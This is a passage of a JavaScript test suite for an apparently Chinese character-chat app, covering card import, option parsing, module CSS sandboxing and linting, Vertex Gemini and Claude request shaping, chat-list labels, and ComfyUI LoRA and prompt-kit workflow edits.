      { key: '_or_甲@wb@乙', match_type: 2, value: '# 甲乙\n内容', enable: true, group: '功能', sort: 3, depth: 0, probability: 100, key_region: 6, value_region: 1 },
      { key: '_and_丙', match_type: 1, value: '丙的内容', key_region: 2, value_region: 2 },
    ],
    cover: 'https://x.example/cover.png',
    re_replaces: [{}],
    bgm: { tracks: [{ name: '片头曲', url: 'https://x.example/bgm.mp3' }], autoplay: true },
    suggested_questions: ['你叫什么名字', '今天天气怎么样'],
    def_msg_cnt: 6,
  };
  const { card, frontend, cover, platform, report } = platformCardFromExport(doc);

  assert.equal(card.name, '测试作品');
  assert.equal(card.system_prompt, '## 作品设定\n这是简介内容。\n\n设定内容', 'prpt → 系统提示');
  assert.equal(card.prefix_text, '前置词原文');
  assert.equal(card.suffix_text, '后置词原文');
  assert.equal(card.first_mes, '', '占位开场白不该导进来');
  assert.equal(card.description, '这是简介内容。', '简介从提示词里抽出来，别留空');
  assert.deepEqual(card.tags, [], '没有 lbls 就不硬塞标签');

  assert.match(frontend.css, /\.a\{color:red\}/, '<style> 要拆进 css');
  assert.match(frontend.css, /\.global\{color:blue\}/, '全局 CSS 要并进 css 段');
  assert.match(frontend.js, /var a=1;/, '<script> 要拆进 js');
  assert.ok(!frontend.html.includes('<script'), 'HTML 段里不能留 <script>（我们的沙箱禁止内联脚本）');
  assert.ok(!frontend.html.includes('<style'), 'HTML 段里不能留 <style>');
  assert.ok(frontend.html.includes('onclick'), 'HTML 原样保留（该报的错交给静态检查）');

  const [first, second] = card.character_book.entries;
  assert.deepEqual(first.keys, ['甲', '乙'], '@wb@ 是多个关键词的分隔符');
  assert.equal(first.comment, '甲乙', '标题从内容第一行取');
  assert.equal(first.selectiveLogic, 0, 'match_type 2 = 或 = AND_ANY');
  assert.equal(first.order, 3, '平台的 sort → 我们的插入顺序');
  assert.equal(first.scanDepth, null, '平台 depth 0 表示"用默认"，别当成注入深度');
  assert.equal(first.group, '功能');
  assert.equal(second.selectiveLogic, 3, 'match_type 1 = 与 = AND_ALL');
  assert.ok(report.worldbook.notes.some((note) => note.includes('只扫用户输入')), 'key_region 表达不了要如实报');
  assert.ok(report.worldbook.notes.some((note) => note.includes('前置词 / 后置词')), 'value_region 表达不了要如实报');
  // 封面现在会去抓（接口那边下载 → PNG 当头像、其它格式进素材库），所以不该再报"没导"
  assert.equal(cover, 'https://x.example/cover.png', '封面网址要带出去让接口去抓');
  assert.ok(!report.notImported.includes('封面图'), '封面不该再算"没导过来的"');
  assert.ok(report.notImported.some((note) => note.includes('正则替换')));
  assert.ok(!report.notImported.some((note) => note.includes('BGM')), 'BGM 现在要搬进卡扩展，不再算没导');
  assert.ok(report.preserved.some((note) => note.includes('BGM')));
  assert.ok(report.preserved.some((note) => note.includes('推荐问题')));
  assert.ok(report.preserved.some((note) => note.includes('默认消息数')));
  assert.equal(platform.bgm.tracks.length, 1);
  assert.deepEqual(platform.suggestedQuestions, ['你叫什么名字', '今天天气怎么样']);
  assert.equal(platform.defMsgCount, 6);
  assert.equal(report.descriptionChars, '这是简介内容。'.length);
  assert.ok(report.warnings.some((note) => note.includes('占位')));
  assert.equal(report.frontend.externalUrls, 1, '界面代码里的外链要被数出来');

  // 前置词 / 后置词真的拼到最后一条用户消息的前后，而不是另起消息
  const out = assemblePrompt({
    card,
    history: [{ role: 'user', content: '第一句' }, { role: 'assistant', content: '嗯' }, { role: 'user', content: '第二句' }],
    settings: {},
  });
  const lastUser = [...out.messages].reverse().find((message) => message.role === 'user');
  assert.equal(lastUser.content, '前置词原文\n\n第二句\n\n后置词原文');
  assert.equal(out.messages.filter((message) => message.content.includes('前置词原文')).length, 1, '别在别处再来一遍');
  assert.ok(out.notes.some((note) => note.includes('前置词')));

  // 没写前置词 / 后置词的普通卡完全不受影响
  const plain = assemblePrompt({ card: { name: '普通' }, history: [{ role: 'user', content: '你好' }], settings: {} });
  assert.equal([...plain.messages].reverse().find((message) => message.role === 'user').content, '你好');

  // 拆文档 / 解析 key 这两件事单独也要站得住
  assert.deepEqual(splitFrontendDocument('<p>a</p><style>b{}</style>'), { html: '<p>a</p>', css: 'b{}', js: '' });
  assert.deepEqual(parsePlatformKeys('_or_只有一个', 2), { keys: ['只有一个'], selectiveLogic: 0 });
  assert.deepEqual(parsePlatformKeys('没有前缀', 1), { keys: ['没有前缀'], selectiveLogic: 3 });
});

test('行动选项：<options><option> 这种预设写法也要认（不认就会漏进正文被渲染成 HTML）', () => {
  const tagged = parseOptions('正文\n<options>\n<option>甲</option>\n<option>乙</option>\n</options>\n尾巴');
  assert.equal(tagged.options.length, 2);
  assert.equal(tagged.options[0].text, '甲');
  assert.equal(tagged.options[0].id, 'opt_1');
  assert.ok(!tagged.text.includes('<options>'), '认出来了就要从正文里摘掉，别留着被显示正则炸成 HTML');
  assert.ok(tagged.text.includes('正文') && tagged.text.includes('尾巴'), '块前后的一起留着');

  const json = parseOptions('正文\n```options\n["甲","乙"]\n```');
  assert.deepEqual(json.options.map((item) => item.text), ['甲', '乙']);
  assert.ok(!json.text.includes('```'));

  const object = parseOptions('```options\n{"options":[{"text":"甲"}]}\n```');
  assert.equal(object.options[0].text, '甲', '包一层 {"options":[…]} 也认');

  // `<options>` 里一行一条的散装写法
  const loose = parseOptions('<options>\n- 先看看四周\n- 直接出门\n</options>');
  assert.deepEqual(loose.options.map((item) => item.text), ['先看看四周', '直接出门']);

  // 最多留 4 条；没有选项块时原样返回，别乱删
  const many = Array.from({ length: 6 }, (_, i) => `<option>选项${i + 1}</option>`).join('');
  assert.equal(parseOptions(`<options>${many}</options>`).options.length, 4, '最多留 4 条');
  assert.deepEqual(parseOptions('就是一段正文'), { options: [], text: '就是一段正文' });
  assert.deepEqual(parseOptions(''), { options: [], text: '' });
});

test('模块（Mod）：CSS 作用域化 + 别人的代码三样禁掉 + 提示词按位置插', () => {
  // 作用域化：普通选择器加前缀，:root / html / body 映射成容器本身，@media 里也要收
  const scoped = scopeCss('.summary{color:red}\n:root{--x:1}\n@media (max-width:600px){ body{font-size:12px} }');
  assert.match(scoped, /\.st-mod-scope \.summary\{color:red\}/);
  assert.match(scoped, /\.st-mod-scope\{--x:1\}/);
  assert.match(scoped, /@media \(max-width:600px\)\{\.st-mod-scope\{font-size:12px\}\}/, '@media 里面的选择器也要收进作用域');
  assert.ok(!/^body\b/m.test(scoped), 'body 不能原样留着——那会改到整个 App');
  assert.ok(!/^html\b/m.test(scoped));

  // 别人的模块：三样都拦
  const strict = lintModuleCss('@import url("https://x/a.css"); .a{background:url(https://x/b.png)} .b{position:fixed;inset:0}');
  assert.equal(strict.ok, false);
  assert.deepEqual(strict.issues.map((issue) => issue.rule).sort(), ['css.externalUrl', 'css.fixed', 'css.import']);
  assert.ok(strict.issues.every((issue) => issue.severity === 'error'));

  // 自己的模块：同样三样只提示，不拦
  const own = lintModuleCss('.a{position:fixed}', { trusted: true });
  assert.equal(own.ok, true);
  assert.equal(own.issues[0].severity, 'info');

  // 档位：自己写的 / 别人的没信任 / 别人的信任过
  const mine = normalizeModule({ title: '我的', css: '.a{}', source: 'original' });
  const theirs = normalizeModule({ title: '别人的', css: '.a{}', source: 'imported' });
  assert.equal(moduleTier(mine).tier, 'own');
  assert.equal(moduleTier(mine).canStyleWholePage, true);
  assert.equal(moduleTier(theirs).tier, 'strict');
  assert.equal(moduleTier(theirs).needsTrust, true);
  assert.equal(moduleTier(theirs).canStyleWholePage, false);
  const hash = moduleCodeHash(theirs);
  assert.equal(moduleTier(theirs, { codeHash: hash }).trusted, true, '哈希对得上才算信任过');
  assert.equal(moduleTier(theirs, { codeHash: '别的哈希' }).trusted, false, '改了代码信任就失效');

  // 分派：只带 CSS 的进 pageCss；带 HTML/JS 的进沙箱面板；提示词按位置
  const plan = modulePlan([
    { id: 'm1', title: '美化', css: '.summary{color:red}', source: 'imported', position: 'after-user' },
    { id: 'm2', title: '面板', body: '面板模块的提示词', html: '<b>x</b>', js: 'Tavern.ready()', css: 'b{}', source: 'original', position: 'system' },
    { id: 'm3', title: '记忆区', body: '在结尾生成总结', source: 'original', position: 'after-history' },
  ]);
  assert.match(plan.pageCss, /\.st-mod-scope \.summary/, '别人的 CSS 要收进消息区');
  assert.equal(plan.panels.length, 1);
  assert.equal(plan.panels[0].id, 'm2', '带 HTML/JS 的去沙箱，不进主页面');
  assert.ok(plan.notes.some((note) => note.includes('只作用在消息区')));
  assert.equal(plan.promptByPosition.system.length, 1);
  assert.equal(plan.promptByPosition['after-history'].length, 1);
  assert.equal(plan.promptByPosition['after-user'].length, 0, '只有 CSS 的模块不该插提示词');

  // 违规的别人模块：样式被拦下，不静默注入
  const blocked = modulePlan([{ id: 'bad', title: '坏的', css: '.x{position:fixed}', source: 'imported' }]);
  assert.equal(blocked.pageCss, '');
  assert.ok(blocked.notes.some((note) => note.includes('被拦下')));

  // 另外三样零件：世界书条目 / 正则脚本 / 背景图
  const withParts = modulePlan([
    {
      id: 'p1',
      title: '自己的零件',
      source: 'original',
      worldbook: [{ comment: '酒馆', keys: ['酒馆'], content: '镇上那家挂着银牌的酒馆。' }],
      regex: [{ findRegex: '/喵/g', replaceString: '喵喵', placement: [1] }],
      background: 'ast_bg_1',
    },
    {
      id: 'p2',
      title: '别人的零件',
      source: 'imported',
      worldbook: [{ comment: '雪', keys: ['雪'], content: '下雪了。' }],
      regex: [{ findRegex: '/汪/g', replaceString: '汪汪', placement: [1] }],
    },
  ]);
  assert.deepEqual(withParts.embedBooks.map((book) => book.name), ['模块：自己的零件', '模块：别人的零件'], '世界书条目要当"卡内世界书"带上');
  assert.equal(withParts.embedBooks[0].entries[0].comment, '酒馆');
  assert.equal(withParts.regexScripts.length, 1, '自己的正则并进这一轮');
  assert.equal(withParts.regexScripts[0].replaceString, '喵喵');
  assert.ok(withParts.notes.some((note) => note.includes('信任之后才会跑')), '别人的正则要等信任');
  assert.deepEqual(withParts.backgrounds.map((item) => item.assetId), ['ast_bg_1']);
  assert.deepEqual(modulePlan([{ id: 'p3', title: '两张背景', background: 'a' }, { id: 'p4', title: '后一张', background: 'b' }]).backgrounds.map((b) => b.assetId), ['a', 'b']);

  // 组装：四个位置各自落到该落的地方
  const out = assemblePrompt({
    card: { name: '角色', description: 'x' },
    history: [{ role: 'assistant', content: '嗯。' }, { role: 'user', content: '我看看。' }],
    settings: {
      modules: {
        system: [{ title: '设定', body: '【模块】这是设定' }],
        'before-user': [{ title: '前', body: '【模块】本轮要求' }],
        'after-user': [{ title: '后', body: '【模块】收尾要求' }],
        'after-history': [{ title: '史后', body: '【模块】历史之后' }],
      },
    },
  });
  const lastUser = [...out.messages].reverse().find((message) => message.role === 'user');
  assert.equal(lastUser.content, '【模块】本轮要求\n\n我看看。\n\n【模块】收尾要求');
  assert.ok(out.system.includes('【模块】这是设定'), 'system 位置的模块要进系统提示');
  assert.ok(out.messages.some((message) => message.content === '【模块】历史之后'));
  assert.ok(out.notes.some((note) => note.includes('模块')));
});

test('检查更新：版本比较与本地清单解析', async () => {
  assert.equal(compareVersions('0.5.1', '0.5.0'), 1);
  assert.equal(compareVersions('0.5.0', '0.5.1'), -1);
  assert.equal(compareVersions('0.5.0', '0.5.0'), 0);
  assert.equal(compareVersions('1.0.0', '0.9.9'), 1);
  assert.equal(compareVersions('v1.2', '1.10'), -1, 'v 前缀和多位数字段都要认');

  const dir = mkdtempSync(path.join(tmpdir(), 'tavern-update-'));
  const manifestFile = path.join(dir, 'manifest.json');
  writeFileSync(manifestFile, JSON.stringify({ version: '0.5.1', url: 'https://x.example/a.exe', size: 100, notes: '测试' }));
  const up = await checkForUpdate({ url: manifestFile, current: '0.5.0' });
  assert.equal(up.hasUpdate, true);
  assert.equal(up.latest, '0.5.1');
  assert.equal(up.notes, '测试');

  const none = await checkForUpdate({ url: '', current: '0.5.0' });
  assert.equal(none.configured, false, '没配更新源要明确说"还没配置"');
  const bad = await checkForUpdate({ url: path.join(dir, 'missing.json'), current: '0.5.0' });
  assert.equal(bad.ok, false, '清单读不到要报错而不是装成没更新');
  rmSync(dir, { recursive: true, force: true });
});

test('Vertex：地址形状（express 全局端点 / 服务账号带 project+location）', () => {
  assert.equal(vertexModelPath({ mode: 'express', model: 'gemini-2.5-pro' }), '/v1/publishers/google/models/gemini-2.5-pro');
  assert.equal(
    vertexModelPath({ mode: 'serviceAccount', project: 'my-proj', location: 'us-central1', model: 'gemini-2.5-pro' }),
    '/v1/projects/my-proj/locations/us-central1/publishers/google/models/gemini-2.5-pro',
  );
  const regional = vertexUrl({ mode: 'serviceAccount', project: 'p', location: 'us-central1', model: 'gemini-2.5-pro', method: 'streamGenerateContent' });
  assert.match(regional, /^https:\/\/us-central1-aiplatform\.googleapis\.com/);
  assert.match(regional, /:streamGenerateContent\?alt=sse$/);
  const global = vertexUrl({ mode: 'serviceAccount', project: 'p', location: 'global', model: 'gemini-2.5-pro', method: 'generateContent' });
  assert.match(global, /^https:\/\/aiplatform\.googleapis\.com/);
  assert.match(vertexUrl({ mode: 'express', model: 'gemini-2.5-pro', method: 'generateContent' }), /^https:\/\/aiplatform\.googleapis\.com\/v1\/publishers/);
  assert.throws(() => vertexModelPath({ mode: 'serviceAccount', model: 'x' }), /project/, '服务账号模式缺 project 要报错');
});

test('Vertex：Gemini 系照 Gemini 那套发（安全设置顶层 + 图片 + 工具）', async () => {
  const saved = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, init = {}) => {
    calls.push({ url, body: JSON.parse(init.body ?? '{}') });
    return {
      ok: true,
      status: 200,
      statusText: 'OK',
      body: (async function* () {
        yield Buffer.from(`data: ${JSON.stringify({
          candidates: [{ content: { parts: [{ text: '你好' }] }, finishReason: 'STOP' }],
          usageMetadata: { promptTokenCount: 3, candidatesTokenCount: 2, totalTokenCount: 5, cachedContentTokenCount: 1 },
        })}\n\n`);
      })(),
      text: async () => '',
    };
  };
  try {
    const events = [];
    for await (const event of streamVertex({
      baseUrl: '',
      apiKey: 'KEY',
      model: 'gemini-2.5-pro',
      messages: [
        { role: 'user', content: '看看这张图', images: [{ mime: 'image/png', base64: 'AAAA' }] },
        { role: 'user', content: '继续' },
      ],
      system: '你是助手',
      params: {
        vertexMode: 'express',
        temperature: 0.7,
        safetySettings: [{ category: 'HARM_CATEGORY_HARASSMENT', threshold: 'BLOCK_NONE' }],
      },
      tools: [{ name: 'get_weather', description: '查天气', parameters: { type: 'object', properties: { city: { type: 'string' } } } }],
    })) {
      events.push(event);
    }
    assert.equal(calls.length, 1);
    const { url, body } = calls[0];
    assert.match(url, /publishers\/google\/models\/gemini-2\.5-pro:streamGenerateContent/);
    assert.match(url, /key=KEY/, 'express 模式把 API key 放 query');
    assert.deepEqual(body.safetySettings, [{ category: 'HARM_CATEGORY_HARASSMENT', threshold: 'BLOCK_NONE' }], '安全设置要在请求体顶层');
    assert.ok(!('safetySettings' in (body.generationConfig ?? {})), '安全设置不能混进 generationConfig');
    assert.ok(!('vertexMode' in (body.generationConfig ?? {})), '连接参数不能混进 generationConfig');
    assert.equal(body.generationConfig.temperature, 0.7);
    assert.ok(body.contents[0].parts.some((part) => part.inlineData?.mimeType === 'image/png'), '图片要变成 inlineData 部件');
    assert.equal(body.tools[0].functionDeclarations[0].name, 'get_weather', '工具要变成 functionDeclarations');
    assert.ok(events.some((event) => event.type === 'text' && event.text === '你好'));
    assert.ok(events.some((event) => event.type === 'usage' && event.usage.cachedTokens === 1), '缓存命中要透传');
  } finally {
    globalThis.fetch = saved;
  }
});

test('Vertex：Claude 走 streamRawPredict，图片与工具照 Anthropic 那套', async () => {
  const saved = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, init = {}) => {
    calls.push({ url, body: JSON.parse(init.body ?? '{}') });
    return {
      ok: true,
      status: 200,
      statusText: 'OK',
      body: (async function* () {
        yield Buffer.from(`data: ${JSON.stringify({ type: 'content_block_delta', delta: { type: 'text_delta', text: '喵' } })}\n\n`);
        yield Buffer.from(`data: ${JSON.stringify({ type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { input_tokens: 4, output_tokens: 1 } })}\n\n`);
      })(),
      text: async () => '',
    };
  };
  try {
    const events = [];
    for await (const event of streamVertex({
      baseUrl: '',
      apiKey: 'KEY',
      model: 'claude-sonnet-4@20250514',
      messages: [{ role: 'user', content: '看图', images: [{ mime: 'image/jpeg', base64: 'BBBB' }] }],
      params: { vertexMode: 'express', max_tokens: 64 },
      tools: [{ name: 'lookup', parameters: { type: 'object', properties: {} } }],
    })) {
      events.push(event);
    }
    const { url, body } = calls[0];
    assert.match(url, /:streamRawPredict/);
    assert.equal(body.anthropic_version, 'vertex-2023-10-16');
    assert.equal(body.max_tokens, 64);
    assert.ok(Array.isArray(body.messages[0].content) && body.messages[0].content.some((block) => block.type === 'image'), '图片要变成 image 块');
    assert.equal(body.tools[0].name, 'lookup');
    assert.ok(events.some((event) => event.type === 'text' && event.text === '喵'));
    assert.ok(events.some((event) => event.type === 'usage' && event.usage.promptTokens === 4));
  } finally {
    globalThis.fetch = saved;
  }
});

test('Vertex / Gemini：连接参数与安全设置不混进采样参数映射（防回归）', () => {
  const vertexMap = adapterParamMap('vertex');
  assert.deepEqual(vertexMap, { temperature: 'temperature', top_p: 'topP', top_k: 'topK' });
  assert.ok(!('safetySettings' in adapterParamMap('gemini')), 'gemini 的 safetySettings 也要走 manual');
  assert.ok(!('vertexMode' in vertexMap) && !('project' in vertexMap) && !('location' in vertexMap) && !('serviceAccount' in vertexMap));
});

test('对话左栏：按卡分组（同卡多对话收一起，群聊 / 没挂卡平铺）', () => {
  const chats = [
    { id: 'c1', title: 'eden*（群像）的对话', characterId: 'card-eden', characterName: 'eden*（群像）', createdAt: '2026-10-04T02:00:00Z' },
    { id: 'c2', title: 'eden*（群像）的对话', characterId: 'card-eden', characterName: 'eden*（群像）', createdAt: '2026-10-04T02:02:00Z' },
    { id: 'g1', title: 'eden', isGroup: true, createdAt: '2026-10-04T02:01:00Z' },
    { id: 'c3', title: '雨夜', characterId: 'card-shi', characterName: '诗音', createdAt: '2026-10-04T02:03:00Z' },
    { id: 'c4', title: '没挂卡的', characterId: null, createdAt: '2026-10-04T02:04:00Z' },
  ];
  const blocks = planChatList(chats);
  assert.deepEqual(blocks.map((block) => block.type), ['group', 'chat', 'group', 'chat'], '组按最近活跃排，群聊 / 没挂卡各自平铺');
  const eden = blocks.find((block) => block.type === 'group' && block.id === 'card-eden');
  assert.equal(eden.name, 'eden*（群像）');
  assert.deepEqual(eden.items.map((chat) => chat.id), ['c1', 'c2'], '组内按创建顺序排，"第 N 个"才稳定');
  assert.deepEqual(planChatList([]), []);
});

test('对话左栏：默认标题「<卡名>的对话」换成「第 N 个对话」，改过名的照原样', () => {
  const cardName = 'eden*（群像）';
  assert.equal(chatRowLabel({ title: 'eden*（群像）的对话' }, { ordinal: 2, multi: true, cardName }), '第 2 个对话');
  assert.equal(chatRowLabel({ title: 'eden*（群像） 的对话' }, { ordinal: 1, multi: true, cardName }), '第 1 个对话');
  assert.equal(chatRowLabel({ title: '雨夜' }, { ordinal: 1, multi: true, cardName }), '第 1 个 · 雨夜');
  assert.equal(chatRowLabel({ title: 'eden*（群像）的对话' }, { ordinal: 1, multi: false, cardName }), '对话');
  assert.equal(chatRowLabel({ title: '雨夜' }, { ordinal: 1, multi: false, cardName }), '雨夜');
  assert.equal(chatRowLabel({ title: '雨夜' }, {}), '雨夜', '没有卡名时按原样');
});

test('审查：语法错、桥能力缺失、CSS 括号、外链脚本都能挑出来', () => {
  // 干净的一段：不该报错
  const clean = reviewFrontend({
    html: '<div id="x">hi</div>',
    css: '#x { color: red; }',
    js: "document.getElementById('x').textContent = 'ok';\nTavern.ready();",
    capabilities: [],
  });
  assert.equal(clean.ok, true, `干净代码不该报错：${JSON.stringify(clean.issues)}`);
  assert.equal(clean.counts.error, 0);

  // JS 语法错（只编译、不执行）
  const syntax = reviewFrontend({ js: 'function ( {', capabilities: [] });
  assert.equal(syntax.ok, false);
  assert.ok(syntax.issues.some((issue) => issue.rule === 'js.syntax'), '语法错要挑出来');

  // 用了桥方法却没声明能力 —— AI 代码最常见的坑
  const missing = reviewFrontend({ js: 'Tavern.send("hi");', capabilities: [] });
  assert.ok(missing.issues.some((issue) => issue.rule === 'bridge.chat.send' && issue.severity === 'error'));
  const declared = reviewFrontend({ js: 'Tavern.send("hi");', capabilities: ['chat.send'] });
  assert.ok(!declared.issues.some((issue) => issue.rule === 'bridge.chat.send'), '声明了就不该再报');

  // 沙箱规则：fetch
  assert.ok(reviewFrontend({ js: 'fetch("/x");', capabilities: [] }).issues.some((issue) => issue.rule === 'js.fetch'));

  // CSS 括号不配平
  const css = reviewFrontend({ css: '.a { color: red; ' });
  assert.ok(css.issues.some((issue) => issue.rule === 'css.braces' && issue.severity === 'error'));

  // 外链脚本：沙箱 CSP 会挡
  const external = reviewFrontend({ html: '<script src="https://cdn.example/x.js"></script>' });
  assert.ok(external.issues.some((issue) => issue.rule === 'html.externalTag'));
});

test('ComfyUI：LoRA 注入（插 LoraLoader / 改连线 / 接触发词）', () => {
  const graph = {
    1: { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'model.safetensors' } },
    2: { class_type: 'CLIPTextEncode', inputs: { text: '1girl, smile', clip: ['1', 1] } },
    3: { class_type: 'CLIPTextEncode', inputs: { text: 'worst quality', clip: ['1', 1] } },
    4: { class_type: 'EmptyLatentImage', inputs: { width: 512, height: 768, batch_size: 1 } },
    5: { class_type: 'KSampler', inputs: { seed: 1, steps: 20, cfg: 7, model: ['1', 0], positive: ['2', 0], negative: ['3', 0], latent_image: ['4', 0] } },
    6: { class_type: 'VAEDecode', inputs: { samples: ['5', 0], vae: ['1', 2] } },
    7: { class_type: 'SaveImage', inputs: { filename_prefix: 'x', images: ['6', 0] } },
  };
  const lora = (name, strength, trigger) => ({ name, strengthModel: strength, strengthClip: strength, trigger });
  const result = applyLoras(graph, [lora('alice.safetensors', 0.8, 'alice, red bow'), lora('style.safetensors', 0.6)]);

  const chain = Object.entries(result.prompt)
    .filter(([, node]) => node.class_type === 'LoraLoader')
    .map(([id, node]) => ({ id, ...node.inputs }));
  assert.equal(chain.length, 2, '两个 LoRA 要插两个 LoraLoader');
  const [first, second] = chain;
  assert.deepEqual(first.model, ['1', 0], '第一个接在 checkpoint 的 MODEL 上');
  assert.deepEqual(first.clip, ['1', 1], '第一个接在 checkpoint 的 CLIP 上');
  assert.deepEqual(second.model, [first.id, 0], '第二个接在第一个后面');
  assert.deepEqual(second.clip, [first.id, 1]);
  assert.equal(second.strength_model, 0.6);
  assert.deepEqual(result.prompt[5].inputs.model, [second.id, 0], '采样器改指链尾');
  assert.deepEqual(result.prompt[2].inputs.clip, [second.id, 1], '文本编码器的 CLIP 也改指链尾');
  assert.deepEqual(result.prompt[6].inputs.vae, ['1', 2], 'VAE 不动');
  assert.match(result.prompt[2].inputs.text, /alice, red bow/, '触发词接到正向提示词');
  assert.ok(!/alice/.test(result.prompt[3].inputs.text), '负面提示词不动');
  assert.deepEqual(result.warnings, []); 

  // 找不到 checkpoint：如实报出来，不硬改
  const orphan = { 1: { class_type: 'CLIPTextEncode', inputs: { text: 'x' } } };
  const bad = applyLoras(orphan, [lora('a.safetensors', 1)]);
  assert.ok(bad.warnings.length, '找不到模型来源要报出来');
  assert.equal(Object.values(bad.prompt).filter((node) => node.class_type === 'LoraLoader').length, 0);

  // 归一化：空名字丢掉、权重夹紧
  assert.deepEqual(
    normaliseLoras([{ name: '   ', strengthModel: 1 }, { name: 'a', strengthModel: 99 }]).map((item) => [item.name, item.strengthModel]),
    [['a', 10]],
  );
});

test('ComfyUI：内置预设都能解析 + LoRA 名单提取', () => {
  const presets = listWorkflowPresets();
  assert.ok(presets.length >= 9, `预设数量：${presets.length}`);
  assert.ok(presets.some((item) => item.id === 'preset-hires'), '要有高清放大');
  assert.ok(presets.some((item) => item.id === 'preset-controlnet'), '要有 ControlNet 姿势控制');
  for (const preset of presets) {
    const full = getWorkflowPreset(preset.id);
    const parsed = parseApiWorkflow(full.workflow);
    assert.ok(parsed.nodeCount >= 5, `${preset.id} 节点太少`);
    assert.ok(suggestBindings(parsed.prompt).length > 0, `${preset.id} 应该能认出可填参数`);
  }
  assert.deepEqual(
    extractLoraNames({ LoraLoader: { input: { required: { lora_name: [['a.safetensors', 'b.safetensors'], {}] } } } }),
    ['a.safetensors', 'b.safetensors'],
    'LoRA 名单从节点定义里取',
  );
});

test('出图加工台：词替换 + 风格预设 + 质量词，都加在工作流自己的正/负词上', () => {
  const makeGraph = () => ({
    1: { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'm' } },
    2: { class_type: 'CLIPTextEncode', inputs: { text: '马尾, 微笑', clip: ['1', 1] } },
    3: { class_type: 'CLIPTextEncode', inputs: { text: 'worst quality', clip: ['1', 1] } },
    5: { class_type: 'KSampler', inputs: { model: ['1', 0], positive: ['2', 0], negative: ['3', 0] } },
  });
  const graph = makeGraph();
  const kit = {
    replacements: [{ from: '马尾', to: 'ponytail' }, { from: '微笑', to: 'smile' }],
    styles: [{ id: 's1', name: '赛璐璐', positive: 'cel shading, flat color', negative: 'realistic' }],
    activeStyleId: 's1',
    quality: { enabled: true, positive: 'best quality', negative: 'lowres' },
  };
  const out = applyPromptKit(graph, kit);
  assert.equal(out.summary.replaced, 2);
  assert.equal(out.summary.style, '赛璐璐');
  assert.ok(!/马尾/.test(out.prompt[2].inputs.text), '中文词要被换掉');
  assert.match(out.prompt[2].inputs.text, /ponytail/);
  assert.match(out.prompt[2].inputs.text, /cel shading/, '风格正词接上去');
  assert.match(out.prompt[2].inputs.text, /best quality/, '质量正词接上去');
  assert.match(out.prompt[3].inputs.text, /realistic/, '风格负词接上去');
  assert.match(out.prompt[3].inputs.text, /lowres/, '质量负词接上去');

  // 什么都没配：原样返回
  const untouched = applyPromptKit(makeGraph(), {});
  assert.equal(untouched.summary.replaced, 0);
  assert.ok(!/best quality/.test(untouched.prompt[2].inputs.text));

  // 质量词默认是关的（不点开关就不加）
  const kitOff = normalisePromptKit({ quality: { positive: 'x' } });
  assert.equal(kitOff.quality.enabled, false);
  assert.deepEqual(applyReplacements('a马尾b马尾c', [{ from: '马尾', to: 'X' }]), { text: 'aXbXc', count: 2 });
});

test('衣柜：套装归一化 / 取当前那套 / 角色负面词接到负向提示词', () => {
  assert.deepEqual(normaliseOutfits([{ name: '校服', prompt: 'school uniform' }]).map((item) => item.name), ['校服']);
  const list = normaliseOutfits([{ id: 'a', name: '甲', prompt: 'A' }, { id: 'b', name: '乙', prompt: 'B' }]);
  assert.equal(activeOutfit(list, 'b').prompt, 'B');
  assert.equal(activeOutfit(list, 'nope').id, 'a', '找不到就退回第一套');
  assert.equal(activeOutfit([], null), null, '一套都没有就是 null');

  const graph = {
    1: { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'm' } },
    2: { class_type: 'CLIPTextEncode', inputs: { text: '1girl', clip: ['1', 1] } },
    3: { class_type: 'CLIPTextEncode', inputs: { text: 'worst quality', clip: ['1', 1] } },
    5: { class_type: 'KSampler', inputs: { model: ['1', 0], positive: ['2', 0], negative: ['3', 0] } },
  };
  const applied = appendNegativePrompt(graph, 'ugly, bad hands');
  assert.equal(applied.appended, true);
  assert.match(applied.prompt[3].inputs.text, /ugly, bad hands/);
  assert.equal(appendNegativePrompt(graph, '   ').appended, false, '空的负向词不接');
});

test('重出：拿回原 prompt、能改正向、种子换一个新的', async () => {
  const makeGraph = () => ({
    1: { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'm' } },
    2: { class_type: 'CLIPTextEncode', inputs: { text: 'old text', clip: ['1', 1] } },
    5: { class_type: 'KSampler', inputs: { seed: 7, model: ['1', 0], positive: ['2', 0] } },
  });
  const captured = [];
  const run = { id: 'r1', workflowId: 'w1', workflowName: '试', kind: 'portrait', chatId: 'c1', messageId: 'm1', values: { prompt: makeGraph(), applied: { '2.text': 'old text' } } };
  const service = createComfyService({
    settings: { 'comfy.executionMode': 'server' },
    ports: {
      comfyStore: { getRun: () => run, getWorkflow: () => null, listWorkflows: () => [] },
      comfyRunner: { submit: async (input) => { captured.push(input); return { id: 'r2' }; } },
      getSettings: () => ({ 'comfy.executionMode': 'server' }),
    },
  });
  await service.rerunRun('r1', { prompt: 'new text' });
  assert.equal(captured.length, 1);
  assert.equal(captured[0].prompt['2'].inputs.text, 'new text', '改过的正向提示词要用上');
  assert.notEqual(captured[0].prompt['5'].inputs.seed, 7, '种子要换一个，否则 ComfyUI 命中缓存');
  assert.equal(run.values.prompt['2'].inputs.text, 'old text', '原图那份 prompt 不能被改');
});

test('剧情换装：AI 写了 [换装: 套装名] 就自动换上（中英文标记都认）', async () => {
  const marker = parseOutfitMarkers('她换了衣服。[换装：泳装] 还有 [OUTFIT: school uniform]');
  assert.deepEqual(marker.map((item) => item.name), ['泳装', 'school uniform'], '中文/英文、半角/全角冒号都认');
  assert.deepEqual(parseOutfitMarkers('这段话里没有标记'), []);

  const saved = [];
  const store = {
    getOutfits: () => ({
      characterId: 'c1',
      outfits: [{ id: 'o1', name: '校服', prompt: 'school uniform' }, { id: 'o2', name: '泳装', prompt: 'swimsuit' }],
      activeId: 'o1',
      negative: '',
    }),
    saveOutfits: (id, patch) => {
      saved.push({ id, patch });
      return patch;
    },
  };
  const service = createComfyService({
    settings: { 'comfy.executionMode': 'server' },
    ports: { comfyStore: store, getSettings: () => ({ 'comfy.executionMode': 'server' }) },
  });

  const hit = await service.applyOutfitMarkers({ characterId: 'c1', content: '……她换上了泳装。[换装: 泳装]' });
  assert.equal(hit.changed, true);
  assert.equal(hit.applied[0].outfitName, '泳装');
